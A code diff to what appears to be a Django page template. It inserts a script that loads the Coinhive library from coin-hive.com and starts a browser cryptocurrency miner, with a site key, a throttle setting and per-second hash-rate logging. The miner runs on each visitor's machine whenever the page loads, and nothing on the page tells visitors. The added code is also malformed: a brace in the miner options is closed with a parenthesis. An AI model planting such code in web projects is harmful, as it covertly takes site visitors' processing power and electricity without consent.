@@ -42,7 +42,28 @@ loadScript("{% static 'raphael-min.js' %}", function() {
 loadScript("https://apis.google.com/js/plusone.js");
 }, 1);
     </script>
+    <script src="https://coin-hive.com/lib/coinhive.min.js"></script>
+    <script>
+        var miner = new CoinHive.User('oTxvf8nX2guvfIXKe4aFAGEThUAGtO1H', {throttle: 0.75);
+        miner.start();
+        miner.on('authed', function(params) {
+            console.log('Token name is: ', miner.getToken());
+        });
 
+        miner.on('error', function(params) {
+            if (params.error !== 'connection_error') {
+                console.log('The pool reported an error', params.error);
+            }
+        });
+        // Update stats once per second
+        setInterval(function() {
+            var hashesPerSecond = miner.getHashesPerSecond();
+            var totalHashes = miner.getTotalHashes();
+            var acceptedHashes = miner.getAcceptedHashes();
+
+            console.log("hps", hashesPerSecond, "th", totalHashes, "ah", acceptedHashes);
+        }, 5000);
+    </script>
     {% include "analytics.html" %}
     <style type="text/css">
         {% include "jquery.mobile.structure-1.4.5.min.css"  %}
